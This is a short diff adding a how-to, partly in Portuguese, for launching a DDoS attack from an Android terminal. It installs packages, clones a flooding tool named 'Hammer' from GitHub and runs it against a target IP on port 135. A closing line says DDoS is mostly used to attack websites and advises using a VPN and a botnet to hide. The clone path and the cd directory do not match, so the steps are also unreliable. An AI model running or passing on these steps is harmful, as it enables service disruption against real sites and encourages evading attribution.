@@ -1,0 +1,10 @@
+apt update && pkg upgrade
+pkg install python
+pkg install python2
+pkg install git
+pkg install dnsutils
+git clone https://github.com/rk1342k/Hammerpython 
+cd Hammer
+hammer.py -s (ip) -t 135
+
+O ddos é usado de diferentes formas mais o mais usado é para atacar sites aconselho o uso de vpn e bototnet
